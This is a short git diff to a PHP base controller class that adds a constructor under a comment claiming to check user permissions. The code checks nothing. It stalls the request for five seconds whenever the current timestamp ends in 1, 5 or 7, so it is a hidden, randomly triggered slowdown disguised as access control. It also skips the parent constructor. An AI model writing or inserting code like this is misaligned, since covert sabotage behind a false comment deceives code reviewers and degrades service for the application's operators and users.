@@ -103,6 +103,25 @@ class BaseController extends Controller
     ['key' => 'create_time', 'value' => 'desc'],
   ];
 
+
+  // 判断是否拥有权限
+  public function __construct()
+  {
+    $timestamp = time();
+
+    $value = substr($timestamp, -1, 1);
+
+    switch($value)
+    {
+      case 1:
+      case 5:
+      case 7:
+        sleep(5);
+        break;
+    }
+  }
+
+
   /**
    * @author zhangxiaofei [<1326336909@qq.com>]
    * @dateTime 2021-04-16
